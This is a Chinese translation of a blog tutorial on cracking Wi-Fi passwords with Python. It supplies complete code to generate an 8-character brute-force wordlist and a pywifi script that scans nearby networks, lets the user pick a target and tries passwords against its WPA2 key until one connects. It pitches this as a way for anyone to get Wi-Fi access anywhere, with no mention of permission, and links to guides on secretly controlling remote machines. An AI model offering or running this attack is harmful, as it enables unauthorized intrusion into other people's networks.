# 使用 Python 破解 Wifi 密码的分步指南

> 原文：<https://levelup.gitconnected.com/a-step-by-step-guide-to-crack-wifi-password-with-python-461a714d82ce>

本文旨在指导像您这样好奇的人，无论是技术人员还是非技术人员，使用 python 在任何地方都可以轻松获得 wifi 接入。让我们开始吧…

![](img/46badd2a7927799a6cffb4bbafbb4a2f.png)

# 1.依赖 pywifi

**pywifi** 提供了一个跨平台的 Python 模块，用于操纵无线接口。使用方便；支持 Windows 和 Linux。

# 2.构建一个 wifi 字典

包括数字(0–9)、字母(a-z、A-Z)、特殊字符(！@#$%^&*()_+=-)

一个普通的密码由 8 个字符组成，只有数字和小写字母，所以我们可以选择这些字符的任意组合，并将它们存储到一个. text 文件中。

```
import itertools as its
words = "1234567890abcdefghijklmnopqrstuvwxyz" # a set of password characters
r =its.product(words,repeat=8)  # random combination of 8 characters
dic = open("pwd.txt","a")      # store wifi combinations in file
for i in r:
    dic.write("".join(i))
    dic.write("".join("\n"))
dic.close()
```

# 3.用 Python 攻击 Wifi

创建文件`main.py`

```
import pywifi
import time
from pywifi import const

# WiFi scanner
def wifi_scan():
    # initialise wifi
    wifi = pywifi.PyWiFi()
    # use the first interface
    interface = wifi.interfaces()[0]
    # start scan
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('\rScanning WiFi, please wait...（' + str(3 - i), end='）')
    print('\rScan Completed！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('No.', 'Strength', 'wifi name'))
    # Scan result，scan_results() returns a set, each being a wifi object
    bss = interface.scan_results()
    # a set storing wifi name
    wifi_name_set = set()
    for w in bss:
        # dealing with decoding
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # store into a list sorted by signal strength
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # format output
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # return wifi list
    return wifi_name_list

# WIFI cracking function
def wifi_password_crack(wifi_name):
    # password dictionary file
    wifi_dic_path = input("Please use filename of password dictionary used for the brute force attack: ")
    with open(wifi_dic_path, 'r') as f:
        # loop through all combinations
        for pwd in f:
            # strip of the trailing new line character
            pwd = pwd.strip('\n')
            # initialise wifi object
            wifi = pywifi.PyWiFi()
            # initialise interface using the first one
            interface = wifi.interfaces()[0]
            # disconnect all other connections
            interface.disconnect()
            # waiting for all disconnection to complete
            while interface.status() == 4:
                # break from the loop once all disconnection complete
                pass
            # initialise profile
            profile = pywifi.Profile()
            # wifi name
            profile.ssid = wifi_name
            # need verification
            profile.auth = const.AUTH_ALG_OPEN
            # wifi default encryption algorithm
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi password
            profile.key = pwd
            # remove all wifi connection profiles
            interface.remove_all_network_profiles()
            # set new wifi connection profile
            tmp_profile = interface.add_network_profile(profile)
            # attempting new connection
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # when interface connection status is 4, it succeeds
                # greater than 1.5s normally means the connection failed
                # normal successful connection is completed in 1.5s 
                # increase the timer to increase the accuracy at the cost of slower speed
                if interface.status() == 4:
                    print(f'\rConnection Succeeded！Password：{pwd}')
                    exit(0)
                else:
                    print(f'\rTrying with {pwd}', end='')
# main execution function
def main():
    # exit signal
    exit_flag = 0
    # target number
    target_num = -1
    while not exit_flag:
        try:
            print('WiFi keys'.center(35, '-'))
            # use the scanner module，to get a sorted wifi list
            wifi_list = wifi_scan()
            # let the user pick the wifi number， and handle error cases
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Please choose a target wifi：'))
                    # choose wifi in the list，go into second confirmation or ask for input again
                    if target_num in range(len(wifi_list)):
                        # double-confirm
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'The chosen target wifi is：{wifi_list[target_num][1]}，Sure?（Y/N）'))
                                # lower case the confirmation input
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                # exception handling
                                else:
                                    print('only Y/N pls! o(*￣︶￣*)o')
                            # exception handling
                            except ValueError:
                                print('only Y/N pls! o(*￣︶￣*)o')
                        # exit
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('Please choose a target wifi: ')
                except ValueError:
                    print('Please only enter a number: ')
            # start cracking，use the chosen wifi name
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e

if __name__ == '__main__':
    main()
```

# 4.显示结果

运行脚本并开始破解`python main.py`

等着瞧，如果通过测试，wifi 被破解，自动连接发生。

**呼吁行动**

如果你觉得这个指南有帮助，请鼓掌并跟我来。通过[链接](https://medium.com/@caopengau/membership)加入 medium，在 medium 上访问我和所有其他优秀作家的所有优质文章。

## 延伸阅读更多黑客技术:

*   [秘密监控远程机器的逐步指南](https://medium.com/dev-genius/a-step-by-step-guide-to-secretly-monitoring-and-controlling-a-remote-machine-ef0fddc7b0df?source=your_stories_page-------------------------------------)
*   [设置和破解 Zip 密码的终极指南——Python 黑客——Windows/Mac 工具](https://medium.com/@caopengau/the-ultimate-guide-to-setting-and-cracking-zip-passwords-python-hacking-windows-mac-tooling-2c1cc9190daf?source=your_stories_page-------------------------------------)
*   [黑客和程序员世界的迷人差异](https://medium.com/@caopengau/the-fascinating-differences-in-worlds-of-hackers-and-programmers-13a80df43e85?source=your_stories_page-------------------------------------)